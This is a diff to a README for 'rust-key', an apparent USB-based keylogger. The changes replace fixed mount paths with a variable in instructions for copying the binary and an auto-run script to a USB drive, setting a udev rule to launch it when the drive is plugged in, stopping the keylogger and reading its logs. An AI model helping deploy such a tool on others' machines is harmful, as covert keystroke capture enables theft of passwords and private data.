@@ -36,25 +36,36 @@ The compiled binary will be located at `target/release/rust-key`.
    - Use a common filesystem like ext4, FAT32, or exFAT
    - FAT32 is recommended for maximum compatibility
 
-2. **Copy files to the USB drive**:
+2. **Find your USB mount point**:
    ```bash
-   # Mount your USB drive (example: /dev/sdb1 mounted at /media/usb)
-   # Adjust the paths according to your system
+   # Use lsblk to find your USB device and mount point
+   lsblk
    
-   # Copy the binary
-   cp target/release/rust-key /media/usb/rust-key
+   # Common mount point locations:
+   # - Ubuntu/Debian (modern): /media/$USER/VOLUME_NAME
+   # - Fedora/RHEL: /run/media/$USER/VOLUME_NAME
+   # - Older systems/manual: /mnt/usb or /media/usb
    
-   # Copy the auto-run script
-   cp usb_autorun.sh /media/usb/usb_autorun.sh
-   
-   # Make both executable
-   chmod +x /media/usb/rust-key
-   chmod +x /media/usb/usb_autorun.sh
+   # Set USB_MOUNT variable for convenience (replace with your actual path)
+   USB_MOUNT="/media/$USER/your_usb_name"
    ```
 
-3. **Your USB drive should now have**:
+3. **Copy files to the USB drive**:
+   ```bash
+   # Copy the binary
+   cp target/release/rust-key $USB_MOUNT/rust-key
+   
+   # Copy the auto-run script
+   cp usb_autorun.sh $USB_MOUNT/usb_autorun.sh
+   
+   # Make both executable
+   chmod +x $USB_MOUNT/rust-key
+   chmod +x $USB_MOUNT/usb_autorun.sh
    ```
-   /media/usb/
+
+4. **Your USB drive should now have**:
+   ```
+   $USB_MOUNT/
    ├── rust-key           (the compiled binary)
    └── usb_autorun.sh     (the auto-run script)
    ```
@@ -68,8 +79,8 @@ To automatically run the script when the USB drive is plugged in, you have a few
 Simply run the script manually after plugging in the USB drive:
 
 ```bash
-# Navigate to the USB drive
-cd /media/usb
+# Navigate to the USB drive (use your actual mount point)
+cd $USB_MOUNT
 
 # Run the script
 ./usb_autorun.sh
@@ -87,8 +98,11 @@ Create a udev rule that runs the script when the specific USB drive is detected:
 2. Create a udev rule at `/etc/udev/rules.d/99-usb-autorun.rules`:
    ```bash
    # Replace XXXX:YYYY with your USB vendor:product ID
-   ACTION=="add", ATTRS{idVendor}=="XXXX", ATTRS{idProduct}=="YYYY", RUN+="/media/usb/usb_autorun.sh"
+   # Replace $USB_MOUNT with your actual USB mount point
+   ACTION=="add", ATTRS{idVendor}=="XXXX", ATTRS{idProduct}=="YYYY", RUN+="$USB_MOUNT/usb_autorun.sh"
    ```
+   
+   **Note**: The path in the udev rule must be the absolute path where your USB drive gets mounted. This may vary by system.
 
 3. Reload udev rules:
    ```bash
@@ -106,7 +120,7 @@ Create a udev rule that runs the script when the specific USB drive is detected:
 
 2. **Navigate to the USB drive**:
    ```bash
-   cd /media/usb  # Or wherever your USB is mounted
+   cd $USB_MOUNT  # Replace with your actual USB mount point
    ```
 
 3. **Run the auto-run script**:
@@ -134,7 +148,7 @@ To stop the keylogger, you have two options:
 
 1. **Use the generated stop script**:
    ```bash
-   cd /media/usb
+   cd $USB_MOUNT  # Replace with your actual USB mount point
    ./stop_keylogger.sh
    ```
 
@@ -151,7 +165,7 @@ To stop the keylogger, you have two options:
 All logs are stored on the USB drive in the `logs/` directory:
 
 ```
-/media/usb/
+$USB_MOUNT/
 ├── rust-key
 ├── usb_autorun.sh
 ├── stop_keylogger.sh  (created when you run the script)
